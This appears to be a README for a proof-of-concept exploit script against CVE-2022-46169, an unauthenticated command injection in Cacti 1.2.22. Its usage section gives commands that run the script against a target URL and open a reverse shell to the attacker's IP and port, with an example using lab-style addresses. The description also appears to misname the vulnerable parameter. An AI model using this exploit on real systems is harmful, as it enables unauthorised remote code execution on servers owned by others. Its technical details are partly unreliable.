# CVE-2022-46169 POC

This is a Proof of Concept (POC) script for the CVE-2022-46169 vulnerability that affects Cacti version 1.2.22.

## Description

The CVE-2022-46169 vulnerability allows an unauthenticated command injection in Cacti versions through 1.2.22 in order to achieve unauthenticated remote code execution as the www-data user. The vulnerability is caused by improper validation of user input in the "host_id" parameter of the "remote_agent.php" file.

## Usage

```bash
python CVE-2022-46169.py --url <TARGET_URL> --ip <YOUR_IP> --port <YOUR_PORT>
```

Replace <TARGET_URL> with the URL of the target Cacti installation, <YOUR_IP> with the IP address of the machine where you want to receive the reverse shell, and <YOUR_PORT> with the port number where you want to receive the reverse shell.

Example:

```bash
python CVE-2022-46169.py --url http://10.10.11.211 --ip 10.10.14.5 --port 1337
